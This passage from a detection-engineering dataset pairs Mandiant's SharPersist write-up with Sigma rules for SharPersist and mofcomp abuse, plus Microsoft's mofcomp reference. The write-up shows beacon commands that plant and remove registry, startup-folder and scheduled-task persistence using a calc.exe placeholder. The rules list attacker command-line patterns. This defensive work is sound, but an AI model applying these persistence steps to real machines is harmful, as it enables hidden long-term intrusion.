Techniques\n\nThere are several persistence techniques that are supported in SharPersist at the time of this blog post. A full list of these techniques and their required privileges is shown in Figure 3.\n\n| **Technique**           | **Description**                               | **Technique Switch Name (-t)** | **Admin Privileges Required?** | **Touches Registry?** | **Adds/Modifies Files on Disk?** |\n| ----------------------- | --------------------------------------------- | ------------------------------ | ------------------------------ | --------------------- | -------------------------------- |\n| KeePass                 | Backdoor KeePass configuration file           | keepass                        | No                             | No                    | Yes                              |\n| New Scheduled Task      | Creates new scheduled task                    | schtask                        | No                             | No                    | Yes                              |\n| New Windows Service     | Creates new Windows service                   | service                        | Yes                            | Yes                   | No                               |\n| Registry                | Registry key/value creation/modification      | reg                            | No                             | Yes                   | No                               |\n| Scheduled Task Backdoor | Backdoors existing scheduled task with action | schtaskbackdoor                | Yes                            | No                    | Yes                              |\n| Startup Folder          | Creates LNK file in user startup folder       | startupfolder                  | No                             | No                    | Yes                              |\n| Tortoise SVN            | Creates Tortoise SVN hook script              | tortoisesvn                    | No                             | Yes                   | No                               |\n\n*Figure 3: Table of supported persistence techniques*\n\n## SharPersist Examples\n\nOn the SharPersist GitHub, there is full documentation on usage and examples for each persistence technique. A few of the techniques will be highlighted below.\n\n### Registry Persistence\n\nThe first technique that will be highlighted is the registry persistence. A full listing of the supported registry keys in SharPersist is shown in Figure 4.\n\n| **Registry Key Code (-k)** | **Registry Key**                                           | **Registry Value**     | **Admin Privileges Required?** | **Supports Env Optional Add-On (-o env)?** |\n| -------------------------- | ---------------------------------------------------------- | ---------------------- | ------------------------------ | ------------------------------------------ |\n| hklmrun                    | HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run         | User supplied          | Yes                            | Yes                                        |\n| hklmrunonce                | HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce     | User supplied          | Yes                            | Yes                                        |\n| hklmrunonceex              | HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx   | User supplied          | Yes                            | Yes                                        |\n| userinit                   | HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon | Userinit               | Yes                            | No                                         |\n| hkcurun                    | HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run         | User supplied          | No                             | Yes                                        |\n| hkcurunonce                | HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce     | User supplied          | No                             | Yes                                        |\n| logonscript                | HKCU\\Environment                                           | UserInitMprLogonScript | No                             | No                                         |\n| stickynotes                | HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run         | RESTART_STICKY_NOTES   | No                             | No                                         |\n\n*Figure 4: Supported registry keys table*\n\nIn the following example, we will be performing a validation of our arguments and then will add registry persistence. Performing a validation before adding the persistence is a best practice, as it will make sure that you have the correct arguments, and other safety checks before actually adding the respective persistence technique. The example shown in Figure 5 creates a registry value named “Test” with the value “cmd.exe /c calc.exe” in the “HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run” registry key.\n\n```image\nAlt: Adding registry persistence\nDescription: The image shows a terminal or command-line interface displaying the output of executing commands related to the SharPersist toolkit. It highlights the process of checking and adding registry persistence using the command 'SharPersist.exe'. Key outputs include success messages for checking arguments, confirming the registry key does not exist, and successful addition of a registry entry under 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'. The command arguments used are visible, indicating the addition of a command to run 'cmd.exe /c calc.exe'.\nTranscription: |\n  beacon> execute-assembly /root/Toolkit/SharPersist.exe -t reg -m check -k hkcurun -v \"Test\" -c \"cmd.exe\" -a \"/c calc.exe\"\n  [*] Tasked beacon to run .NET program: SharPersist.exe -t reg -m check -k hkcurun -v \"Test\" -c \"cmd.exe\" -a \"/c calc.exe\"\n  [+] host called home, sent: 336559 bytes\n  [+] received output:\n  [*] INFO: Checking for correct arguments given\n  [+] SUCCESS: Correct arguments given\n  [*] INFO: Checking if registry key and value supplied already exists\n  [+] SUCCESS: Registry key and value do NOT exist\n  [*] INFO: Checking if you can write to that registry location\n  [+] SUCCESS: You have write permissions to that registry key\n  \n  beacon> execute-assembly /root/Toolkit/SharPersist.exe -t reg -m add -k hkcurun -v \"Test\" -c \"cmd.exe\" -a \"/c calc.exe\"\n  [*] Tasked beacon to run .NET program: SharPersist.exe -t reg -m add -k hkcurun -v \"Test\" -c \"cmd.exe\" -a \"/c calc.exe\"\n  [+] host called home, sent: 336559 bytes\n  [+] received output:\n  [*] INFO: Adding registry persistence\n  [*] INFO: Command: cmd.exe\n  [*] INFO: Command Args: /c calc.exe\n  [*] INFO: Registry Key: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n  [*] INFO: Registry Value: Test\n  [*] INFO: Option:\n  [+] SUCCESS: Registry persistence added\n```\n\n*Figure 5: Adding registry persistence*\n\nOnce the persistence needs to be removed, it can be removed using the “-m remove” argument, as shown in Figure 6. We are removing the “Test” registry value that was created previously, and then we are listing all registry values in “HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run” to validate that it was removed.\n\n```image\nAlt: Removing registry persistence\nDescription: The image displays a terminal or command-line interface output showing the execution of commands related to the SharPersist Windows Persistence Toolkit. It indicates the removal of a registry persistence entry named 'Test' from the 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' registry key. The output shows informational messages confirming the removal of the registry value and the listing of all current registry values in the specified location.\nTranscription: |\n  beacon> execute-assembly /root/Toolkit/SharPersist.exe -t reg -m remove -k hkcurun -v \"Test\"\n  [*] Tasked beacon to run .NET program: SharPersist.exe\n  [+] host called home, sent: 336501 bytes\n  [+] received output:\n  [*] INFO: Removing registry persistence\n  [*] INFO: Registry Key: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n  [*] INFO: Registry Value: Test\n  [*] INFO: Option:\n  [+] SUCCESS: Registry persistence removed\n  \n  beacon> execute-assembly /root/Toolkit/SharPersist.exe -t reg -m list -k hkcurun\n  [*] Tasked beacon to run .NET program: SharPersist.exe\n  [+] host called home, sent: 336477 bytes\n  [+] received output:\n  [*] INFO: Listing all registry values in: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n```\n\n*Figure 6: Removing registry persistence*\n\n### Startup Folder Persistence\n\nThe second persistence technique that will be highlighted is the startup folder persistence technique. In this example, we are creating an LNK file called “Test.lnk” that will be placed in the current user’s startup folder and will execute “cmd.exe /c calc.exe”, shown in Figure 7.\n\n```image\nAlt: Performing dry-run and adding startup folder persistence\nDescription: The image is a screenshot of a command-line interface displaying the execution of the SharPersist tool in C#. It shows the process of adding a startup folder persistence technique by creating a LNK file named 'Test.lnk' that executes 'cmd.exe /c calc.exe'. The output indicates checks for existing files, successful argument validation, and the successful creation of the LNK file in the user's startup folder. It also includes details about the command issued and the file's location.\nTranscription: |\n  beacon> execute-assembly /root/Toolkit/SharPersist.exe -t startupfolder -m check -f \"Test\" -c \"cmd.exe\" -a \"/c calc.exe\"\n  [*] Tasked beacon to run .NET program: SharPersist.exe -t startupfolder -m check -f \"Test\" -c \"cmd.exe\" -a \"/c calc.exe\"\n  [*] host called home, sent: 33653 bytes\n  [*] received output:\n  [+] INFO: Checking if that file already exists in: C:\\Users\\hpottter.HOGWARTS\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\n  [+] SUCCESS: LNK file with that name does NOT exist\n  \n  beacon> execute-assembly /root/Toolkit/SharPersist.exe -t startupfolder -m add -f \"Test\" -c \"cmd.exe\" -a \"/c calc.exe\"\n  [*] Tasked beacon to run .NET program: SharPersist.exe -t startupfolder -m add -f \"Test\" -c \"cmd.exe\" -a \"/c calc.exe\"\n  [*] host called home, sent: 33653 bytes\n  [*] received output:\n  [+] INFO: Adding startup folder persistence\n  [+] INFO: Command: cmd.exe\n  [+] INFO: Command Args: /c calc.exe\n  [+] INFO: File Name: Test\n  [+] SUCCESS: Startup folder persistence created\n  [+] INFO: LNK File located at: C:\\Users\\hpottter.HOGWARTS\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Test.lnk\n  [+] INFO: SHA256 Hash of LNK file: 9A94A930A3DF2C83F712C67A39D9BD957F3385ADC71BF5D8EB984\n```\n\n*Figure 7: Performing dry-run and adding startup folder persistence*\n\nThe startup folder persistence can then be removed, again using the “-m remove” argument, as shown in Figure 8. This will remove the LNK file from the current user’s startup folder.\n\n```image\nAlt: Removing startup folder persistence\nDescription: The image shows a terminal session demonstrating the use of the SharPersist toolkit for managing Windows startup folder persistence. The commands executed include listing all LNK files in the startup folder, with details about the LNK file 'Test.lnk', its target path, and arguments. Additionally, it shows the execution of a command to remove the 'Test.lnk' file from the startup folder, confirming the successful removal of startup folder persistence.\nTranscription: |\n  beacon> execute-assembly /root/Toolkit/SharPersist.exe -t startupfolder -m list\n  [+] Tasked beacon to run .NET program: SharPersist.exe -m list\n  [+] host called home, sent: 336475 bytes\n  [+] received output:\n  \n  [*] INFO: Listing all LNK files in startup folder persistence location.\n  [*] INFO: Current LNK files in: C:\\Users\\hpoter.HOGWARTS\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\n  \n  [*] INFO: LNK File Name: Test.lnk\n  [*] INFO: LNK Description:\n  [*] INFO: LNK Target Path: C:\\Windows\\system32\\cmd.exe\n  [*] INFO: LNK Arguments: /c calc.exe\n  \n  beacon> execute-assembly /root/Toolkit/SharPersist.exe -t startupfolder -m remove -f \"Test\"\n  [+] Tasked beacon to run .NET program: SharPersist.exe -m remove -f \"Test\"\n  [+] host called home, sent: 336499 bytes\n  [+] received output:\n  \n  [*] INFO: Removing startup folder persistence\n  [*] INFO: File Name: Test\n  [*] SUCCESS: Startup folder persistence removed\n  \n  beacon> execute-assembly /root/Toolkit/SharPersist.exe -t startupfolder -m list\n  [+] Tasked beacon to run .NET program: SharPersist.exe -m list\n  [+] host called home, sent: 336475 bytes\n  [+] received output:\n  \n  [*] INFO: Listing all LNK files in startup folder persistence location.\n```\n\n*Figure 8: Removing startup folder persistence*\n\n### Scheduled Task Backdoor Persistence\n\nThe last technique highlighted here is the scheduled task backdoor persistence. Scheduled tasks can be configured to execute multiple actions at a time, and this technique will backdoor an existing scheduled task by adding an additional action. The first thing we need to do is look for a scheduled task to backdoor. In this case, we will be looking for scheduled tasks that run at logon, as shown in Figure 9.\n\n```image\nAlt: Listing scheduled tasks that run at logon\nDescription: The image displays a command-line interface (CLI) session where a user is executing a command related to the SharPersist Windows Persistence Toolkit. The specific command executed is aimed at listing all scheduled tasks that can be backdoored, focusing on tasks that trigger at logon. The output provides detailed information about a specific scheduled task named 'ReconcileLanguageResources', including its path, owner, next run time, trigger type, and action. This image is informative as it illustrates the process and output of using the SharPersist toolkit for identifying scheduled tasks for potential backdoor actions.\nTranscription: |\n  beacon> execute-assembly /root/Toolkit/SharPersist.exe -t schtasksbackdoor -m list -o logon\n  [*] Tasked beacon to run .NET program: SharPersist.exe -t schtasksbackdoor -m list -o logon\n  [+] host called home, sent: 336497 bytes\n  [+] received output:\n  [*] INFO: Listing all scheduled tasks available to backdoor.\n  [+] received output:\n  [*] INFO: TASK NAME:\n  ReconcileLanguageResources\n  [*] INFO: TASK PATH:\n  \\Microsoft\\Windows\\LanguageComponentsInstaller\n  [*] INFO: TASK OWNER:\n  BUILTIN\\Administrators\n  [*] INFO: NEXT RUN TIME:\n  1/1/0001 12:00:00 AM\n  [*] INFO: TASK TRIGGER:\n  Logon\n  [*] INFO: TASK ACTION:\n  LanguageOverlayServer (d0582e3b-3126-4caa-9155-ac37c912a489)\n```\n\n*Figure 9: Listing scheduled tasks that run at logon*\n\nOnce we have a scheduled task that we want to backdoor, we can perform a dry run to ensure the command will successfully work and then actually execute the command as shown in Figure 10.\n\n```image\nAlt: Performing dry run and adding scheduled task backdoor persistence\nDescription: The image depicts a command-line interface showing the execution of a persistence technique using the SharPersist toolkit. The commands executed include checking for a scheduled task, adding a backdoor to it, and verifying the status of the scheduled task. Key output messages indicate successful checks and actions taken regarding the scheduled task named 'ReconcileLanguageResources,' including commands to run 'cmd.exe' and 'calc.exe' as part of the backdoor persistence.\nTranscription: |\n  beacon> execute-assembly /root/Toolkit/SharPersist.exe -st schtasksbackdoor -m check -n \"ReconcileLanguageResources\" -c \"cmd.exe\" -a \"/c calc.exe\"\n  [*] Tasked beacon to run .NET program: SharPersist.exe -c \"cmd.exe\" -a \"/c calc.exe\"\n  [*] host called home, sent: 336065 bytes\n  [*] received output:\n  [*] INFO: Checking if scheduled task exists to backdoor.\n  [+] received output:\n  [+] SUCCESS: A scheduled task with that name exists.\n  [*] INFO: Checking if schedule task has backdoored action.\n  [+] SUCCESS: That scheduled task is NOT backdoored\n  [*] INFO: Checking for correct arguments given\n  [+] SUCCESS: Correct arguments given\n  beacon> execute-assembly /root/Toolkit/SharPersist.exe -st schtasksbackdoor -m add -n \"ReconcileLanguageResources\" -c \"cmd.exe\" -a \"/c calc.exe\"\n  [*] Tasked beacon to run .NET program: SharPersist.exe -c \"cmd.exe\" -a \"/c calc.exe\"\n  [*] host called home, sent: 336061 bytes\n  [*] received output:\n  [*] INFO: Adding scheduled task backdoor persistence.\n  [*] INFO: Command: cmd.exe\n  [*] INFO: Command Args: /c calc.exe\n  [*] INFO: Scheduled Task Name: ReconcileLanguageResources\n```\n\n*Figure 10: Performing dry run and adding scheduled task backdoor persistence*\n\nAs you can see in Figure 11, the scheduled task is now backdoored with our malicious action.\n\n```image\nAlt: Listing backdoored scheduled task\nDescription: The image displays a command-line interface output showing the execution of a command using the SharPersist toolkit. It lists the details of a scheduled task named 'ReconcileLanguageResources,' including its path, owner, next run time, trigger, and actions associated with it. The output indicates that the task is set to run at logon and includes a command that executes the calculator application (calc.exe). Overall, the image is informative as it provides specific technical details relevant to backdooring scheduled tasks.\nTranscription: |\n  beacon> execute-assembly /root/Toolkit/SharPersist.exe -t schtaskbackdoor -m list -n \"ReconcileLanguageResources\"\n  [*] Tasked beacon to run .NET program: SharPersist.exe -t schtaskbackdoor -m list -n \"ReconcileLanguageResources\"\n  [+] host called home, sent: 336543 bytes\n  [+] received output:\n  [*] INFO: Listing scheduled task details of name that was specified.\n  [*] INFO: TASK NAME:\n  ReconcileLanguageResources\n  [*] INFO: TASK PATH:\n  \\Microsoft\\Windows\\LanguageComponentsInstaller\n  [*] INFO: TASK OWNER:\n  BUILTIN\\Administrators\n  [*] INFO: NEXT RUN TIME:\n  1/1/0001 12:00:00 AM\n  [*] INFO: TASK TRIGGER:\n  Logon\n  [*] INFO: TASK ACTION:\n  LanguageOverLayerServer (d0582e3b-3126-4ca3-9155-ac372912a489)\n  [*] INFO: TASK ACTION:\n  cmd.exe /c calc.exe\n```\n\n*Figure 11: Listing backdoored scheduled task*\n\nA backdoored scheduled task action used for persistence can be removed as shown in Figure 12.\n\n```image\nAlt: Removing backdoored scheduled task action\nDescription: The image is a screenshot from a command line interface displaying the output of a command related to the removal of a scheduled task backdoor persistence using the SharPersist toolkit in C#. It shows the command executed, which is aimed at removing a scheduled task named 'ReconcileLanguageResources.' The output indicates that the removal process was successful, detailing the task name and confirming the action. The context suggests this is part of demonstrating persistence techniques in a cybersecurity scenario.\nTranscription: |\n  beacon> execute-assembly /root/Toolkit/SharPersist.exe -t schtaskbackdoor -m remove -n \"ReconcileLanguageResources\"\n  [*] Tasked beacon to run .NET program: SharPersist.exe -t schtaskbackdoor -m remove -n \"ReconcileLanguageResources\"\n  [+] host called home, sent: 336547 bytes\n  [+] received output:\n  [*] INFO: Removing scheduled task backdoor persistence\n  [*] INFO: Scheduled Task Name: ReconcileLanguageResources\n  [+] received output:\n  [+] SUCCESS: Scheduled task backdoor removed\n```\n\n*Figure 12: Removing backdoored scheduled task action*\n\n## Conclusion\n\nUsing reflective C# to assist in various phases of the attack lifecycle is a necessity in the offensive community and persistence is no exception. Windows provides multiple techniques for persistence and there will continue to be more discovered and used by security professionals and adversaries alike.\n\nThis tool is intended to aid security professionals in the persistence phase of the attack lifecycle. By releasing SharPersist, we at FireEye Mandiant hope to bring awareness to the various persistence techniques that are available in Windows and the ability to use these persistence techniques with C# rather than PowerShell.\n\n---\n\n### Posted in:\n- Threat Intelligence\n- Security & Identity",
    "sigma_rule": {
      "title": "HackTool - SharPersist Execution",
      "id": "26488ad0-f9fd-4536-876f-52fea846a2e4",
      "status": "test",
      "description": "Detects the execution of the hacktool SharPersist - used to deploy various different kinds of persistence mechanisms",
      "references": [
        "https://www.mandiant.com/resources/blog/sharpersist-windows-persistence-toolkit",
        "https://github.com/mandiant/SharPersist"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-09-15",
      "modified": "2023-02-04",
      "tags": [
        "attack.persistence",
        "attack.t1053"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\SharPersist.exe"
          },
          {
            "Product": "SharPersist"
          }
        ],
        "selection_cli_1": {
          "CommandLine|contains": [
            " -t schtask -c ",
            " -t startupfolder -c "
          ]
        },
        "selection_cli_2": {
          "CommandLine|contains|all": [
            " -t reg -c ",
            " -m add"
          ]
        },
        "selection_cli_3": {
          "CommandLine|contains|all": [
            " -t service -c ",
            " -m add"
          ]
        },
        "selection_cli_4": {
          "CommandLine|contains|all": [
            " -t schtask -c ",
            " -m add"
          ]
        },
        "condition": "1 of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_hktl_sharpersist.yml",
    "id": "227"
  },
  {
    "url": "https://github.com/The-DFIR-Report/Sigma-Rules/blob/75260568a7ffe61b2458ca05f6f25914efb44337/win_mofcomp_execution.yml",
    "markdown": "# The-DFIR-Report / Sigma-Rules / win_mofcomp_execution.yml\n\ntitle: MOFComp Execution\nid: fd7aed23-7585-44fb-9920-5da82c740e6e\nstatus: Experimental\ndescription: Detects abuse of mofcomp to load WMI classes i.e. to create WMI event subscriptions\nauthor: _pete_0, TheDFIRReport\nreferences:\n  - https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/\ndate: 2022/07/11\nmodified: 2022/07/11\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith:\n      - '\\mofcomp.exe'\n    ParentImage|endswith:\n      - '\\cmd.exe'\n      - '\\powershell.exe'\n  condition: selection\nfields:\n  - ParentCommandLine\nfalsepositives:\n  - System administrator activities\nlevel: high\ntags:\n  - attack.execution\n  - attack.t1546.003",
    "sigma_rule": {
      "title": "Potential Suspicious Mofcomp Execution",
      "id": "1dd05363-104e-4b4a-b963-196a534b03a1",
      "status": "test",
      "description": "Detects execution of the \"mofcomp\" utility as a child of a suspicious shell or script running utility or by having a suspicious path in the commandline.\nThe \"mofcomp\" utility parses a file containing MOF statements and adds the classes and class instances defined in the file to the WMI repository.\nAttackers abuse this utility to install malicious MOF scripts\n",
      "references": [
        "https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/",
        "https://github.com/The-DFIR-Report/Sigma-Rules/blob/75260568a7ffe61b2458ca05f6f25914efb44337/win_mofcomp_execution.yml",
        "https://learn.microsoft.com/en-us/windows/win32/wmisdk/mofcomp"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-07-12",
      "modified": "2023-04-11",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\mofcomp.exe"
          },
          {
            "OriginalFileName": "mofcomp.exe"
          }
        ],
        "selection_case": [
          {
            "ParentImage|endswith": [
              "\\cmd.exe",
              "\\powershell.exe",
              "\\pwsh.exe",
              "\\wsl.exe",
              "\\wscript.exe",
              "\\cscript.exe"
            ]
          },
          {
            "CommandLine|contains": [
              "\\AppData\\Local\\Temp",
              "\\Users\\Public\\",
              "\\WINDOWS\\Temp\\",
              "%temp%",
              "%tmp%",
              "%appdata%"
            ]
          }
        ],
        "filter_main_wmiprvse": {
          "ParentImage": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
          "CommandLine|contains": "C:\\Windows\\TEMP\\",
          "CommandLine|endswith": ".mof"
        },
        "filter_optional_null_parent": {
          "CommandLine|contains": "C:\\Windows\\TEMP\\",
          "CommandLine|endswith": ".mof"
        },
        "condition": "all of selection_* and not 1 of filter_main_* and not 1 of filter_optional_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_mofcomp_execution.yml",
    "id": "256"
  },
  {
    "url": "https://learn.microsoft.com/en-us/windows/win32/wmisdk/mofcomp",
    "markdown": "# mofcomp\n\nThe *Managed Object Format (MOF)* compiler parses a file containing MOF statements and adds the classes and class instances defined in the file to the WMI repository. MOF files are usually automatically compiled during the installation of the systems with which they are provided, but you can also compile MOF files by using this tool.\n\nFor more information about locating and using mofcomp.exe, see Using WMI Management Tools). For information about removing classes and instances from the WMI repository, see the **pragma deleteclass** preprocessor command.\n\nThe following code example shows how to run the MOF compiler on a file.\n\n```\nmofcomp\n  [-autorecover]\n  [-check]\n  [-N:<namespacepath>]\n  [-class:createonly | -class:forceupdate |\n   -class:safeupdate | -class:updateonly ]\n  [-instance:updateonly | -instance:createonly]\n  [-B:<filename>]\n  [-WMI]\n  [-P:<Password>]\n  [-U:<UserName>]\n  [-A:<Authority>]\n  [-MOF:<path>]\n  [-MFL:<path>]\n  [-AMENDMENT:<Locale>]\n  [-ER:<ResourceName>]\n  [-L:<ResourceLocale>]\n  <MOFfile>\n```\n\n## Switches\n\n### -autorecover\n\nAdds the named MOF file to the list of files compiled during repository recovery. The list of autorecover MOF files is stored in the registry key:\n\n**HKEY_LOCAL_MACHINE**\\\\**SOFTWARE**\\\\**Microsoft**\\\\**WBEM**\\\\**CIMOM**\n\nThe MOF files listed in this registry entry must reside on the local computer because MOF files that use the **autorecover** command cannot recover MOF files located on a remote computer.\n\n> **Note**\n> To ensure that all your WMI class definitions for managed objects are restored to the *WMI repository* if WMI has a failure and restarts, use the **#pragma autorecover** preprocessor instruction in your *Managed Object Format* (MOF) file.\n\n### -check\n\nRequests that the compiler perform a syntax check only and print appropriate error messages. No other switch can be used with this switch. When this switch is used, no connection to Windows Management Instrumentation (WMI) is established and no modifications to the WMI repository are made.\n\n### -N:<*namespacepath*>\n\nRequests that the compiler load the MOF file into the namespace specified as *namespacepath*. The compiled MOF is loaded into the default Mofcomp namespace, root\\\\default, unless this switch is used. You can also insert the preprocessor command **#pragma namespace (\"*namespace path*\")** in the MOF file to achieve the same effect. If both the **-N:** switch and the #pragma namespace command are used, **#pragma namespace** takes priority. In this case, the only way to compile the MOF into another namespace is to edit the MOF file and change the **#pragma namespace** command. A remote computer can be specified using `\\\\machinename\\root\\default`.\n\n### -class:createonly\n\nRequests that the compiler not make any changes to existing classes. When this switch is used, the compile operation terminates if a class specified in the MOF file already exists.\n\n### -class:forceupdate\n\nForces updates of classes when conflicting child classes exist. For example, suppose a class qualifier is defined in a child class and the base class tries to add the same qualifier. In **-class:forceupdate** mode, the MOF compiler resolves this conflict by deleting the conflicting qualifier in the child class. If the child class has instances, the forced update fails.\n\n### -class:safeupdate\n\nAllows updates of classes even if there are child classes, as long as the change does not cause conflicts with child classes. For example, this flag allows adding a new property to the base class that was not previously mentioned in child classes. If the child classes have instances, the update fails.\n\n### -class:updateonly\n\nRequests that the compiler not create any new classes. When this switch is used, the compile operation terminates if a class specified in the MOF file does not exist.\n\n### -instance:updateonly\n\nRequests that the compiler not create any new instances. When this switch is used, the compile operation terminates if an instance specified in the MOF file does not exist.\n\n### -instance:createonly\n\nRequests that the compiler not make any changes to existing instances. When this switch is used, the compile operation terminates if an instance specified in the MOF file already exists.\n\n### -B:<*filename*>\n\nRequests that the compiler create a binary version of the MOF file with the name *filename* without making any modifications to the WMI repository.\n\nIf you use the **-B:<*filename*>** option to create a binary MOF file, only default qualifier flavors are stored in the WMI repository.\n\nBinary MOF format is the intermediate format for combining a WDM-driver with the MOF as a resource. The binary MOF represents classes and instances just as a text MOF file does and is compressed before it is stored on disk.\n\n### -WMI\n\nRequests that the compiler perform a WMI syntax check. The **-B:** switch must be used with this switch. The **-WMI** switch is only used for building binary MOF files for use by WDM device drivers. This switch invokes a separate binary MOF file checker, which runs after the binary MOF file is created.\n\n### -P:<*Password*>\n\nSpecifies *Password* as the password for the computer user to enter when logging on.\n\n### -U:<*UserName*>\n\nSpecifies *UserName* as the name of the user logging on.\n\n### -A:<*Authority*>\n\nSpecifies *Authority* as the authority (domain name) to use when logging on to WMI.\n\n### -MOF:<*path*>\n\nName of the language neutral output. Used with the **-AMENDMENT** switch to specify the name of the language-neutral MOF file that will be generated.\n\n### -MFL:<*path*>\n\nName of the language specific output. Used with the **-AMENDMENT** switch to specify the name of the language-specific MOF file that will be generated.\n\n### -AMENDMENT:<*Locale*>\n\nSplits the MOF file into language-neutral and -specific versions. The MOF compiler creates a language-neutral form of the MOF file that has all amended qualifiers removed. A localized version of the MOF file is also created with an MFL file name extension. The *Locale* parameter specifies the name of the child namespace that contains the localized class definitions. The format of the *Locale* parameter is MS_xxx where xxx is the hexadecimal value of the Windows LCID. For example, the locale for American English is MS_409.\n\n### -ER <*ResourceName*>\n\nExtracts binary MOF from a named resource. This switch gets the binary MOF from the class in the WMI repository while the -B switch creates the binary MOF format from a MOF file.\n\n### -L:<*ResourceLocale*>\n\nOptional. Extracts the localized MOF descriptions from the binary MOF when used with -ER switch.\n\n### <*MOFfile*>\n\nName of the file to parse.\n\n## Return Values\n\nAs its first operation, the MOF compiler performs a syntax check on the MOF file. If the compiler finds any errors, it prints an error message and the process terminates.\n\nThe MOF compiler can return the following values:\n\n- **0**: MOF compile operation was successful.\n- **1**: The MOF compiler could not connect with the WMI server. This is either because of a semantic error such as an incompatibility with the existing WMI repository or an actual error such as the failure of the WMI server to start.\n- **2**: One or more command-line switches were not valid.\n- **3**: A MOF syntax error occurred.\n\nIf the MOF file is parsed correctly, but an attempt is made to perform an operation that is forbidden by a command-line switch, the compiler returns an error code generated by WMI instead of any of the return codes listed in the list preceding. For example, a WMI error code is returned when the **-instance:updateonly** switch is specified and the MOF file attempts to create an instance.\n\nIf the **#pragma autorecover** preprocessor statement is not in the file, then the following warning is returned:\n\n```\nWARNING: FileYourMof.Mof does not contain #PRAGMA AUTORECOVER.\nIf the WMI repository is rebuilt in the future, the contents of this\nMOF file   will not be included in the new WMI repository.\nTo include this MOF file when the WMI Repository is automatically\nreconstructed, place the #PRAGMA AUTORECOVER statement on the first\nline of the MOF file.\n```\n\n## Remarks\n\nThe MOF Compiler is available in the `%Windir%\\System32\\wbem` directory. You must specify the MOF file as the parameter of the MOF Compiler. You can also specify an Autorecover switch if you want the MOF file to be automatically recompiled if the CIM Repository ever has to be automatically recovered. For more information, type **Mofcomp /?** at the command prompt.\n\nA MOF file that uses the Unicode character set contains a signature as the first two bytes of the file. This signature is either U+FFFE or U+FEFF, depending on the byte ordering of the file.\n\nWhen no errors occur in the parsing process, the MOF compiler connects to the WMI server running on the local computer unless the **-check** switch is specified. Classes and instances defined in the MOF file are added to the WMI repository.\n\nWhen an error occurs in updating the WMI repository, the compiler makes no attempt to return the repository to its state before the compiler began processing.\n\n**Windows 8**: When installing a provider, mofcomp treats the [Key] and [Static] qualifiers as true if they are present, regardless of their actual values. Other qualifiers are treated as false if they are present but not explicitly set to true.\n\n## Requirements\n\n| Requirement               | Value             |\n|---------------------------|-------------------|\n| Minimum supported client   | Windows Vista     |\n| Minimum supported server   | Windows Server 2008 |\n\n## See also\n\n- **pragma namespace**\n- Compiling MOF Files\n- Compiling Localized MOF Files\n- Registering a Provider\n- **IMOFCompiler::CompileFile**",
    "sigma_rule": {
      "title": "Potential Suspicious Mofcomp Execution",
      "id": "1dd05363-104e-4b4a-b963-196a534b03a1",
      "status": "test",
      "description": "Detects execution of the \"mofcomp\" utility as a child of a suspicious shell or script running utility or by having a suspicious path in the commandline.\nThe \"mofcomp\" utility parses a file containing MOF statements and adds the classes and class instances defined in the file to the WMI repository.\nAttackers abuse this utility to install malicious MOF scripts\n",
      "references": [
        "https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/",
        "https://github.com/The-DFIR-Report/Sigma-Rules/blob/75260568a7ffe61b2458ca05f6f25914efb44337/win_mofcomp_execution.yml",
        "https://learn.microsoft.com/en-us/windows/win32/wmisdk/mofcomp"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-07-12",
      "modified": "2023-04-11",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\mofcomp.exe"
          },
          {
            "OriginalFileName": "mofcomp.exe"
          }
        ],
        "selection_case": [
          {
            "ParentImage|endswith": [
              "\\cmd.exe",
              "\\powershell.exe",
              "\\pwsh.exe",
              "\\wsl.exe",
              "\\wscript.exe",
              "\\cscript.exe"
            ]
          },
          {
            "CommandLine|contains": [
              "\\AppData\\Local\\Temp",
              "\\Users\\Public\\",
              "\\WINDOWS\\Temp\\",
              "%temp%",
              "%tmp%",
              "%appdata%"
            ]
          }
        ],
        "filter_main_wmiprvse": {
          "ParentImage": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
          "CommandLine|contains": "C:\\Windows\\TEMP\\",
          "CommandLine|endswith": ".mof"
        },
        "filter_optional_null_parent": {
          "CommandLine|contains": "C:\\Windows\\TEMP\\",
          "CommandLine|endswith": ".mof"
        },
